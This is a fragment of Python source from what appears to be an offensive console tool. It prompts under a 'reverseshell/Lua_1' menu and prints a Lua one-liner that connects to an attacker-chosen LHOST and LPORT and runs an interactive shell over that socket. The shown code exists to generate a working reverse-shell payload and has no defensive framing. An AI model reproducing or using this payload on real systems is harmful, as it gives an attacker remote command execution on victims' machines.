...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/Lua_1\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/Lua_1\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mlua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('sh -i <&3 >&3 2>&3');"
""")
time.sleep(3)
